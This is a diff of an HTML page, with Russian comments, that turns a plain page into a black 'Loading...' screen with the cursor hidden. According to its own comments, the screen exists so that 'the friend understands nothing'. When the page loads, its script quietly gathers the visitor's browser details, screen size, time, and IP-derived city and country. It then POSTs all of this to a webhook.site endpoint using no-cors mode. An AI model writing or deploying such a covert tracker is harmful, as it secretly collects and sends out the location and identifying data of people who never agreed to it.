@@ -1,26 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>ok</title>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        /* Черный экран, без курсора, чтобы друг ничего не понял */
+        body { 
+            background: black; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            width: 100vw; 
+            cursor: none; 
+            overflow: hidden; 
+        }
+    </style>
 </head>
 <body>
 
-<h1>ok</h1>
-
 <script>
 (async () => {
-    const data = {
+    // Собираем всё: от разрешения экрана до версии браузера
+    const info = {
         url: location.href,
-        ua: navigator.userAgent
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        screen: screen.width + "x" + screen.height,
+        time: new Date().toLocaleString(),
+        ip: "N/A",
+        city: "N/A",
+        country: "N/A"
     };
 
-    await fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
-        method: "POST",
-        body: new URLSearchParams(data)
-    });
+    try {
+        // Узнаем IP и город через сторонний сервис
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        info.ip = d.ip;
+        info.city = d.city;
+        info.country = d.country_name;
+    } catch(e) {}
 
-    console.log("sent");
+    try {
+        // Отправляем всё на твой Webhook
+        await fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
+            method: "POST",
+            mode: "no-cors", // Чтобы браузер не ругался на безопасность
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(info)
+        });
+    } catch(e) {}
 })();
 </script>
 
